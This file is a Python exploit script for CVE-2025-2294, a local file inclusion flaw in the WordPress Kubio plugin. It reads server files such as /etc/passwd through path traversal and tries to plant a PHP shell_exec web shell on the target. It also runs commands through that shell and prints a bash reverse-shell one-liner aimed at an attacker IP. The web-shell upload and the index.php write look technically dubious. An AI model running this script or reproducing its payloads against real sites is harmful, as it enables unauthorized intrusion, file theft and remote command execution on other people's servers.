import requests
import argparse
import time
import random
import string
import os

session = requests.Session()
requests.packages.urllib3.disable_warnings()
session.verify = False

banner = """
  ____ ___ ____  _____      _    ____ ___   ___  _ ____  
 / ___|_ _|  _ \| ____|    / \  |  _ \_ _| / _ \| '_ \ \ 
| |    | || |_) |  _|     / _ \ | |_) | || | | | |_) |\ \ 
| |___ | ||  __/| |___   / ___ \|  __/| || |_| |  __/ / /
 \____|___|_|   |_____| /_/   \_\_|  |___|\___/|_|   /_/  
         CVE-2025-2294 Unauth LFI + WebShell by rHz0d
"""

def fetch_readme(url):
    target = f"{url}/wp-content/plugins/kubio/readme.txt"
    try:
        response = session.get(target, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException:
        return None

def is_vulnerable(readme_content):
    for line in readme_content.splitlines():
        if "Stable tag:" in line:
            version = line.split(":")[-1].strip()
            major, minor, patch = map(int, version.split("."))
            if (major, minor, patch) <= (2, 5, 1):
                print(f"[+] Detected vulnerable version: {version}")
                return True
            break
    return False

def build_exploit_url(url, target_file):
    return f"{url}/?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template={target_file}"

def send_exploit_request(full_url):
    try:
        response = session.get(full_url, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException:
        return None

def display_result(content):
    if content:
        print("[+] Exploit successful. File content:")
        print(content)
    else:
        print("[-] Exploit failed or file not readable.")

def exploit(target_url, file_to_read):
    readme = fetch_readme(target_url)
    if readme and is_vulnerable(readme):
        print("[*] Attempting to read file...")
        exploit_url = build_exploit_url(target_url, file_to_read)
        result = send_exploit_request(exploit_url)
        display_result(result)
        return True
    else:
        print("[-] Target is not vulnerable or readme.txt not accessible.")
        return False

def upload_webshell(target_url, shell_filepath):
    print("[*] Attempting to upload WebShell...")

    # 读取本地 shell.php 文件内容
    if not os.path.exists(shell_filepath):
        print(f"[-] File {shell_filepath} does not exist.")
        return None

    with open(shell_filepath, "r") as shell_file:
        payload = shell_file.read()

    # 使用 shell.php 上传
    webshell_filename = os.path.basename(shell_filepath)
    upload_path = f"../../../../../../../../wp-content/uploads/{webshell_filename}"

    exploit_url = build_exploit_url(target_url, upload_path)
    try:
        response = session.post(exploit_url, data=payload, timeout=10)
        shell_url = f"{target_url}/wp-content/uploads/{webshell_filename}"
        print(f"[+] WebShell may be available at: {shell_url}")
        return shell_url
    except requests.RequestException:
        print("[-] Upload failed")
        return None

def execute_cmd_via_webshell(shell_url, cmd):
    try:
        print(f"[*] Executing command: {cmd}")
        response = session.get(shell_url, params={"cmd": cmd}, timeout=10)
        print(response.text)
    except requests.RequestException:
        print("[-] Command execution failed.")

def check_webshell(shell_url):
    try:
        response = session.get(shell_url, timeout=10)
        if response.status_code == 200:
            print(f"[+] WebShell is active: {shell_url}")
        else:
            print("[-] WebShell is not accessible.")
    except requests.RequestException:
        print("[-] WebShell check failed.")

def brute_force_paths(target_url, file_list):
    print("[*] Starting path brute force...")
    for path in file_list:
        test_url = f"{target_url}/wp-content/uploads/{path}"
        try:
            response = session.get(test_url, timeout=10)
            if response.status_code == 200:
                print(f"[+] WebShell found at: {test_url}")
                return test_url
        except requests.RequestException:
            continue
    return None

def print_reverse_shell_payload(attacker_ip, port):
    print("[*] Reverse Shell Payload (bash):")
    payload = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
    print(payload)

def write_index_php(target_url):
    print("[*] Writing WebShell to index.php...")
    payload = "<?php if(isset($_REQUEST['cmd'])){echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>'; } ?>"
    index_url = f"{target_url}/wp-content/themes/yourtheme/index.php"
    try:
        response = session.post(index_url, data=payload, timeout=10)
        if response.status_code == 200:
            print(f"[+] WebShell written to: {index_url}")
        else:
            print("[-] Failed to write index.php")
    except requests.RequestException:
        print("[-] Error while writing index.php")

def main():
    print(banner)
    parser = argparse.ArgumentParser(description="CVE-2025-2294 Exploit Script")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., https://example.com)")
    parser.add_argument("-m", "--mode", required=True, choices=["check", "upload", "brute", "cmd", "reverse", "write"], help="Mode to run")
    parser.add_argument("-f", "--file", default="../../../../../../../../etc/passwd", help="File to read (default: /etc/passwd)")
    parser.add_argument("-c", "--cmd", help="Command to execute via WebShell")
    parser.add_argument("-r", "--reverse", nargs=2, metavar=('IP', 'PORT'), help="Show reverse shell command (no exec)")
    parser.add_argument("--path", help="WebShell path to check or use")
    parser.add_argument("--shell", required=True, help="Path to local WebShell (e.g., /path/to/shell.php)")  # 添加 shell 参数
    args = parser.parse_args()

    target_url = args.url.rstrip("/")

    if args.mode == "check":
        print("[*] Checking vulnerability...")
        if exploit(target_url, args.file):
            print("[+] Target is vulnerable")
        else:
            print("[-] Target is not vulnerable")

    elif args.mode == "upload":
        print("[*] Uploading WebShell...")
        shell = upload_webshell(target_url, args.shell)  # 上传本地 shell.php
        if shell:
            check_webshell(shell)

    elif args.mode == "brute":
        print("[*] Brute forcing WebShell paths...")
        file_list = ["shell1.php", "shell2.php", "shell3.php"]  # Add more paths here
        shell_path = brute_force_paths(target_url, file_list)
        if shell_path:
            check_webshell(shell_path)

    elif args.mode == "cmd":
        if not args.path:
            print("[-] WebShell path is required.")
        else:
            execute_cmd_via_webshell(args.path, args.cmd)

    elif args.mode == "reverse":
        if args.reverse:
            ip, port = args.reverse
            print_reverse_shell_payload(ip, port)
        else:
            print("[-] Reverse shell IP and port required.")

    elif args.mode == "write":
        write_index_php(target_url)

if __name__ == "__main__":
    main()
